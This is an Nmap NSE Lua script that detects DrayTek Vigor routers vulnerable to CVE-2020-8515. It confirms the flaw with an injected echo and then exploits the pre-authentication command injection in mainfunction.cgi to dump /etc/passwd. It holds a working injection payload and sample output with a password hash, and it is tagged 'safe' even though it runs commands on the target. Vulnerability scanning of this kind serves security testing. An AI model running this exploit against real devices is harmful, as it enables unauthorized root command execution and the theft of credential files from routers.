local http = require "http"
local nmap = require "nmap"
local stdnse = require "stdnse"
local shortport = require "shortport"
local vulns = require "vulns"

description = [[
Detects Drayteks devices vulnerable to CVE-2020-8515
This script uses a safe check to confirm the vulnerability
Then dumps the device's /etc/passwd  file
References:
* https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/,
* https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices/,
* https://github.com/imjdl/CVE-2020-8515-PoC
]]

---
-- @usage
-- nmap -p <port> --script http-draytek-rce <ip>
--
-- @output
-- PORT    STATE SERVICE
-- 80/tcp  open  http
-- | http-draytek-rce: 
-- |   VULNERABLE:
-- |   Draytek PreAuth RCE (CVE-2020-8515)
-- |     State: VULNERABLE (Exploitable)
-- |     Risk factor: High
-- |       DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta and Vigor300B 1.3.3_Beta,1.4.2.1_Beta,1.4.4_Beta 
-- |        devices allows pre-auth Remote Code Execution as root via shell metacharacters 
-- |     Extra information:
-- |       root:!:0:0:root:/tmp:/bin/ash
-- |   nobody:*:65534:65534:nobody:/var:/bin/false
-- |   admin:$1$W7DTtEH6$ZBdpFpkAVx.sb6osodugA0:500:500:admin:/tmp:/usr/bin/clish
-- |   quagga:x:51:51:quagga:/tmp/.quagga:/bin/false
-- |   pure_ftpd_user:x:501:503:Linux User,,,:/home/pure_ftpd_user:/bin/sh
-- |   root:!:0:0:root:/tmp:/bin/ash
-- |   nobody:*:65534:65534:nobody:/var:/bin/false
-- |   admin:$1$W7DTtEH6$ZBdpFpkAVx.sb6osodugA0:500:500:admin:/tmp:/usr/bin/clish
-- |   quagga:x:51:51:quagga:/tmp/.quagga:/bin/false
-- |   pure_ftpd_user:x:501:503:Linux User,,,:/home/pure_ftpd_user:/bin/sh
-- |   
-- |     References:
-- |       https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices/
-- |       https://github.com/imjdl/CVE-2020-8515-PoC

author = "truerand0m (twitter.com/truerand0m)"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

portrule = shortport.http

local DEFAULT_URI = "/"

-- helper function to check if is a draytek device
local function check_device(host, port, path)
  local resp = http.get(host, port, path)
  if ( resp and resp.body and http.response_contains(resp, "Vigor") ) then
    return resp
  else
    return false
  end
end

-- safe vulnerability check
local function check_vuln(host,port)
  local vuln_path = "/cgi-bin/mainfunction.cgi"
  
  local safe_check = "A0B1C2D3E4F5G6H7I8J9a0b1c2d3e4f5g6h7i8j9"
  local postdata = "action=login&keyPath=%27%0A%2fbin%2fecho${IFS}"..safe_check.."%0A%27&loginUser=a&loginPwd=a"
  local resp = http.post(host, port, vuln_path,nil,nil,postdata)
  if ( resp and resp.body and http.response_contains(resp, safe_check) ) then
    return resp
  else
    stdnse.print_debug(1,"It doesn't seems vulnerable", SCRIPT_NAME)
    return false
  end
end

-- vuln exploitation
local function exploit_vuln(host,port)
  stdnse.print_debug(1,"Checking vuln", SCRIPT_NAME)
  local vuln_path = "/cgi-bin/mainfunction.cgi"
  
  local cmd = "cat${IFS}/etc/passwd"
  local postdata = "action=login&keyPath=%27%0A%2fbin%2f"..cmd.."%0A%27&loginUser=a&loginPwd=a"
  local resp = http.post(host, port, vuln_path,nil,nil,postdata)
  if ( resp and resp.body ) then
    return resp
  else
    stdnse.print_debug(1,"It doesn't seems vulnerable", SCRIPT_NAME)
    return false
  end
end

-- main logic
action = function(host, port)
  stdnse.print_debug(1,"Device testing", SCRIPT_NAME)
  local output = {}
  local vuln_table = {
    title = "Draytek PreAuth RCE (CVE-2020-8515)",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[
DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta and Vigor300B 1.3.3_Beta,1.4.2.1_Beta,1.4.4_Beta
 devices allows pre-auth Remote Code Execution as root via shell metacharacters ]],
    references = { 'https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/',
      'https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices/',
      'https://github.com/imjdl/CVE-2020-8515-PoC',
    }
  }
    
  local is_draytek = check_device(host, port, DEFAULT_URI)
  if not is_draytek then
    stdnse.print_debug(1,"%s: This doesn't look like draytek device", SCRIPT_NAME)
    return
  end
  
  local is_vulnerable = check_vuln(host, port)
  if not is_vulnerable then
    stdnse.print_debug(1,"%s: This doesn't look like vulnerable device", SCRIPT_NAME)
    return
  else
    vuln_table.state =vulns.STATE.EXPLOIT
  end

  local exploit_res = exploit_vuln(host,port)
  output = exploit_res["body"]
  
  if not exploit_res then
    return
  else
    local report = vulns.Report:new(SCRIPT_NAME, host, port)
    vuln_table.extra_info = output
    return report:make_output(vuln_table)
  end
end
